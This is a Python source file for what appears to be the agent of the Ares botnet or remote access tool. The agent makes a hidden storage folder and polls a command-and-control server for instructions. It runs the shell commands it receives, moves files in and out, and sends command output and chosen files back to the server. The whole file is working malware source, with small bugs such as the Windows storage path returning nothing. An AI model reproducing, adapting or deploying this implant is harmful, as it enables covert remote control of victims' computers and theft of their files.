#!/usr/bin/env python

import requests
import time
import os
import json
import base64
import platform
import shutil
import sys

from settings import Settings
from modules import runcmd, cd, upload, download


class Agent(object):

    def __init__(self):
        self.config = Settings()
        storage = self.get_local_storage()
        if storage:
            settings_file = os.path.join(storage, 'settings.ini')
            self.config.load_from_file(settings_file)
        self.platform = platform.system() + " " + platform.release()
        self.idle = True
        self.last_active = time.time()

    def get_local_storage(self):
        """ Returns path to local storage, or None """
        if os.name == 'nt':
            path = os.path.join(os.getenv('LOCALAPPDATA'), 'ares')
            if not os.path.exists(path):
                os.makedirs(path)
            return 
        elif os.name == 'posix':
            path = os.path.join(os.getenv('HOME'), '.ares')
            if not os.path.exists(path):
                os.makedirs(path)
            return path
        else:
            return None

    def server_hello(self):
        """ Ask server for instructions """
        # Get next command(s)
        req = requests.post(self.config.get('SERVER') + '/api/' + self.config.get('UID') + '/hello',
            json={'platform': self.platform, 'cwd': os.getcwd()})
        json_resp = req.json()
        self.log(json_resp)
        # Set UID if server sent one (anonymous agent)
        if 'set_UID' in json_resp:
            self.config.set('UID', json_resp['set_UID'])
            self.log('UID set to ' + self.config.get('UID'))
        return json_resp

    def server_report(self, cmd_id, cmd_output='', files=None):
        """ Report single command output to server """
        output_files = {}
        if files:
            for file in files:
                output_files[os.path.basename(file)] = open(file, 'rb')
        req = requests.post(self.config.get('SERVER') + '/api/' + self.config.get('UID') + '/report', 
            data={'id': cmd_id, 'output': base64.b64encode(cmd_output), 'cwd': os.getcwd()}, files=output_files)

    def log(self, to_log):
        """ Write data to agent log """
        print to_log

    def check_cnc(self):
        """ Check the agent can communicate with the server """
        self.log('Checking connectivity with CNC...')
        try:
            json_resp = self.server_hello()
            self.log('Connection OK')
            return True
        except Exception as exc:
            self.log('Something went wrong: %s' % exc)
            return False

    def run(self):
        """ Main loop """
        while True:
            try:
                json_resp = self.server_hello()
                # Run each command
                commands = json_resp['cmds']
                for cmd_id in sorted(commands):
                    self.idle = False
                    self.last_active = time.time()
                    commandline = commands[cmd_id]
                    self.log('Running command ' + cmd_id + " : " + commandline)
                    split_cmd = commandline.split(" ")
                    command = split_cmd[0]
                    args = []
                    if len(split_cmd) > 1:
                        args = split_cmd[1:]
                    try:
                        if command == 'cd':
                            cmd_output, output_files = cd.run(' '.join(args))
                        elif command == 'runcmd':
                            cmd_output, output_files = runcmd.run(' '.join(args))
                        elif command == 'upload':
                            cmd_output, output_files = upload.run(' '.join(args))
                        elif command == 'download':
                            cmd_output, output_files = download.run(*args)
                        else:
                            cmd_output, output_files = runcmd.run(commandline)
                        self.server_report(cmd_id, cmd_output, output_files)
                    except Exception as exc:
                        self.server_report(cmd_id, str(exc))
                else:
                    if self.idle:
                        time.sleep(float(self.config.get('HELLO_INTERVAL')))
                    elif (time.time() - self.last_active) > int(self.config.get('IDLE_TIME')):
                        self.log("Switching to idle mode...")
                        self.idle = True
            except Exception as exc:
                self.log(exc)
                time.sleep(float(self.config.get('HELLO_INTERVAL')))


def main():
    from argparse import ArgumentParser
    parser = ArgumentParser()
    parser.add_argument('--check', action='store_true')
    args = parser.parse_args()

    agent = Agent()
    if args.check:
        check = agent.check_cnc()
        if check:
            exit(0)
        else:
            exit(1)
    agent = Agent()
    agent.run()


if __name__ == "__main__":
    main()
